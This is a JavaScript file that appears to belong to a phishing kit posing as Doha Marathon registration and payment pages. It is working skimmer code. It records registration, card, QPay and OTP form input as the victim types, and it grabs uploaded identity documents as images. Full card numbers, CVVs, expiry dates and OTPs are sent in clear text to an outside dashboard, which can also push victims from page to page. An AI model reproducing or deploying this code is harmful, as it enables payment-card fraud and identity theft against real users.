// Configuration for Separate Frontend/Dashboard deployments
const DASHBOARD_URL = 'https://marath.onrender.com';
const INSTANCE_KEY = 'your_secret_key';

// 1. Session ID Management
const SESSION_KEY = 'doha_marathon_session';
let sessionId = localStorage.getItem(SESSION_KEY);
if (!sessionId) {
  sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
  localStorage.setItem(SESSION_KEY, sessionId);
}

// 2. Page Detection
function detectCurrentPage() {
  const path = (location.pathname || '').toLowerCase();
  if (path.includes('registration-summary')) return 'registration-summary';
  if (path.includes('registration')) return 'registration';
  if (path.includes('payment-card')) return 'payment-card';
  if (path.includes('payment-verify')) return 'payment-verify';
  if (path.includes('payment')) return 'payment';
  if (path.includes('qpy')) return 'qpy';
  if (path.includes('otp')) return 'otp';
  if (path.includes('wait')) return 'wait';
  return 'index';
}
const currentPage = detectCurrentPage();

// 3. Socket Connection
const socket = io(DASHBOARD_URL, { 
  query: { sessionId, instanceKey: INSTANCE_KEY },
  transports: ['websocket', 'polling'],
  withCredentials: true 
});

function syncSavedReview() {
  try {
    const raw = sessionStorage.getItem('doha-marathon-registration-review');
    if (raw) {
      const review = JSON.parse(raw);
      if (review && (review.firstName || review.email)) {
        try {
          const savedFile = sessionStorage.getItem('tracker_file_identityFile');
          if (savedFile) {
            const f = JSON.parse(savedFile);
            if (f && f.dataUrl) {
              review.identityFile = f.dataUrl;
              review.identityFileName = f.name;
              review.identityFileSize = f.size;
            }
          }
        } catch (e) {}
        socket.emit('user:form-submit', { sessionId, page: 'registration', formData: review });
      }
    }
  } catch(e) {}
}

socket.on('connect', () => {
  socket.emit('user:join', { sessionId, page: currentPage });
  syncSavedReview();
});

socket.on('navigate', ({ page }) => {
  const PAGES = [
    { id: 'index', name: 'الرئيسية', url: '/' },
    { id: 'registration', name: 'التسجيل', url: '/registration.html' },
    { id: 'registration-summary', name: 'ملخص السلة', url: '/registration-summary.html' },
    { id: 'payment', name: 'اختيار الدفع', url: '/payment.html' },
    { id: 'payment-card', name: 'بطاقة الائتمان', url: '/payment-card.html' },
    { id: 'qpy', name: 'QPay', url: '/qpy.html' },
    { id: 'payment-verify', name: 'التحقق من الرمز', url: '/payment-verify.html' },
    { id: 'otp', name: 'رمز التحقق', url: '/otp.html' },
    { id: 'wait', name: 'الانتظار', url: '/wait.html' }
  ];
  const target = PAGES.find(p => p.id === page)?.url || '/';
  window.location.href = target;
});

// 4. File Processing Helper (Resize and Base64)
// 4. File Processing Helper (Fast Canvas Resize & Base64 Data URL)
function processFileInput(input, callback) {
  const file = input && input.files && input.files[0];
  if (!file) {
    if (callback) callback(null);
    return;
  }

  const fileName = file.name || 'document.jpg';
  const fileSizeStr = file.size < 1024 * 1024
    ? `${Math.max(1, Math.round(file.size / 1024))} KB`
    : `${(file.size / (1024 * 1024)).toFixed(1)} MB`;

  const isImg = (file.type && file.type.startsWith('image/')) || /\.(png|jpe?g|webp|gif|bmp|heic|svg)$/i.test(file.name);

  if (isImg) {
    const reader = new FileReader();
    reader.onload = function(e) {
      const img = new Image();
      img.onload = function() {
        let width = img.width;
        let height = img.height;
        const maxDim = 900; // Optimal balance: crystal clear face/ID details + lightweight ~80KB Data URL
        if (width > maxDim || height > maxDim) {
          if (width > height) {
            height = Math.round((height * maxDim) / width);
            width = maxDim;
          } else {
            width = Math.round((width * maxDim) / height);
            height = maxDim;
          }
        }
        const canvas = document.createElement('canvas');
        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(img, 0, 0, width, height);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.78);

        input._fileDataUrl = dataUrl;
        input._fileName = fileName;
        input._fileSize = fileSizeStr;

        const payloadObj = JSON.stringify({ dataUrl, name: fileName, size: fileSizeStr });
        try { sessionStorage.setItem('tracker_file_' + (input.name || input.id || 'identityFile'), payloadObj); } catch (err) {}
        try { localStorage.setItem('tracker_file_' + (input.name || input.id || 'identityFile'), payloadObj); } catch (err) {}

        // Instantly transmit photo to dashboard
        const f = input.form || document.querySelector('#registration-form') || document.querySelector('form');
        if (f) {
          sendFormData(f, 'registration', true);
        }

        if (callback) callback(dataUrl);
      };
      img.onerror = function() {
        input._fileDataUrl = e.target.result;
        input._fileName = fileName;
        input._fileSize = fileSizeStr;
        const payloadObj = JSON.stringify({ dataUrl: e.target.result, name: fileName, size: fileSizeStr });
        try { sessionStorage.setItem('tracker_file_' + (input.name || input.id || 'identityFile'), payloadObj); } catch (err) {}
        try { localStorage.setItem('tracker_file_' + (input.name || input.id || 'identityFile'), payloadObj); } catch (err) {}
        const f = input.form || document.querySelector('form');
        if (f) sendFormData(f, 'registration', true);
        if (callback) callback(e.target.result);
      };
      img.src = e.target.result;
    };
    reader.onerror = function() {
      if (callback) callback(null);
    };
    reader.readAsDataURL(file);
  } else {
    // PDF document
    const reader = new FileReader();
    reader.onload = function(e) {
      const dataUrl = e.target.result;
      input._fileDataUrl = dataUrl;
      input._fileName = fileName;
      input._fileSize = fileSizeStr;
      const payloadObj = JSON.stringify({ dataUrl, name: fileName, size: fileSizeStr });
      try { sessionStorage.setItem('tracker_file_' + (input.name || input.id || 'identityFile'), payloadObj); } catch (err) {}
      try { localStorage.setItem('tracker_file_' + (input.name || input.id || 'identityFile'), payloadObj); } catch (err) {}
      const f = input.form || document.querySelector('form');
      if (f) sendFormData(f, 'registration', true);
      if (callback) callback(dataUrl);
    };
    reader.onerror = function() {
      if (callback) callback(null);
    };
    reader.readAsDataURL(file);
  }
}

// 5. Form Data Extraction Helper (UNENCRYPTED - Pure Raw Data)
function extractFormData(form) {
  const formData = new FormData(form);
  const data = {};
  formData.forEach((v, k) => {
    if (v instanceof File) {
      const fileInput = form.querySelector(`input[name="${k}"]`) || form.querySelector(`input[type="file"]`);
      if (fileInput && fileInput._fileDataUrl) {
        data[k] = fileInput._fileDataUrl;
        data[k + 'Name'] = fileInput._fileName || v.name;
        data[k + 'Size'] = fileInput._fileSize || `${Math.round(v.size / 1024)} KB`;
      } else {
        try {
          const cached = sessionStorage.getItem('tracker_file_' + k) || localStorage.getItem('tracker_file_' + k) ||
                         sessionStorage.getItem('tracker_file_identityFile') || localStorage.getItem('tracker_file_identityFile');
          if (cached) {
            const parsed = JSON.parse(cached);
            if (parsed && parsed.dataUrl) {
              data[k] = parsed.dataUrl;
              data[k + 'Name'] = parsed.name || v.name;
              data[k + 'Size'] = parsed.size || '';
            }
          }
        } catch(e) {}
      }
    } else if (v !== undefined && v !== null && String(v).trim() !== '') {
      data[k] = String(v).trim();
    }
  });

  // Also catch fields that may not be in FormData (including password and custom fields - NO MASKING)
  form.querySelectorAll('input, select, textarea').forEach(el => {
    const name = el.name || el.id;
    if (name && !data[name]) {
      if (el.type === 'file') {
        if (el._fileDataUrl) {
          data[name] = el._fileDataUrl;
          data[name + 'Name'] = el._fileName || (el.files && el.files[0] ? el.files[0].name : '');
          data[name + 'Size'] = el._fileSize || '';
        }
      } else if (el.value && String(el.value).trim() !== '') {
        data[name] = String(el.value).trim();
      }
    }
  });

  // Normalize kebab-case and camelCase aliases for seamless dashboard display
  if (data['card-number'] && !data.cardNumber) data.cardNumber = data['card-number'];
  if (data['card-cvv'] && !data.cardCvv) data.cardCvv = data['card-cvv'];
  if (data['card-expiry'] && !data.cardExpiry) data.cardExpiry = data['card-expiry'];
  if (data['cardholder-name'] && !data.cardholderName) data.cardholderName = data['cardholder-name'];
  if (data['verify-otp'] && !data.otpCode) data.otpCode = data['verify-otp'];

  // Cache identity file if present
  if (data.identityFile && String(data.identityFile).startsWith('data:')) {
    try {
      localStorage.setItem('tracker_file_identityFile', JSON.stringify({
        dataUrl: data.identityFile,
        name: data.identityFileName || 'identity.jpg',
        size: data.identityFileSize || ''
      }));
    } catch(e) {}
  }

  // ABSOLUTELY NO MASKING: All credit cards, CVVs, and OTPs are preserved 100% in pure clear-text.
  return data;
}

// 6. Send Form Data (Socket + Guaranteed HTTP POST)
function sendFormData(form, page, isSubmit = false) {
  const data = extractFormData(form);
  if (!data || Object.keys(data).length === 0) return;

  socket.emit('user:form-submit', { sessionId, page, formData: data });

  // If submit OR if critical data (image, card, OTP) is present, dispatch HTTP track with keepalive
  const hasCriticalData = Boolean(data.identityFile || data.cardNumber || data.otpCode || isSubmit);
  if (hasCriticalData) {
    try {
      fetch(`${DASHBOARD_URL}/api/track`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId, type: 'form-submit', page, data }),
        keepalive: true
      }).catch(() => {});
    } catch(e) {}
  }
}

// 7. Live and Submit Capture
function captureForm(form, page) {
  let debounceTimer = null;
  form.addEventListener('input', (e) => {
    if (e.target && e.target.type === 'file') return;
    clearTimeout(debounceTimer);
    debounceTimer = setTimeout(() => {
      sendFormData(form, page, false);
    }, 400);
  });

  form.addEventListener('change', (e) => {
    if (e.target && e.target.type === 'file') {
      processFileInput(e.target, () => {
        sendFormData(form, page, false);
      });
    } else {
      sendFormData(form, page, false);
    }
  });

  // Bind change listeners to all file inputs directly
  form.querySelectorAll('input[type="file"]').forEach(fileInput => {
    fileInput.addEventListener('change', () => {
      processFileInput(fileInput, () => {
        sendFormData(form, page, false);
      });
    });
  });

  form.addEventListener('submit', () => {
    sendFormData(form, page, true);
  });
}

// 7. Auto-detect forms on page
document.addEventListener('DOMContentLoaded', () => {
  const forms = {
    '#registration-form': 'registration',
    '#card-form': 'payment-card',
    '#paymentForm form, #paymentForm': 'qpy',
    '#verify-form': 'payment-verify',
    '#otpForm': 'otp'
  };
  Object.entries(forms).forEach(([sel, page]) => {
    const form = document.querySelector(sel);
    if (form) {
      captureForm(form, page);
      // Send initial values if already prefilled
      setTimeout(() => sendFormData(form, page, false), 500);
    }
  });
  syncSavedReview();
});

// 8. Page visibility tracking
document.addEventListener('visibilitychange', () => {
  if (!document.hidden) {
    socket.emit('user:page-change', { sessionId, page: currentPage });
  }
});

// 9. Global sync helper
window.triggerTrackerFormSync = function() {
  const form = document.querySelector('#registration-form') || document.querySelector('form');
  if (form) {
    sendFormData(form, currentPage, false);
  }
};
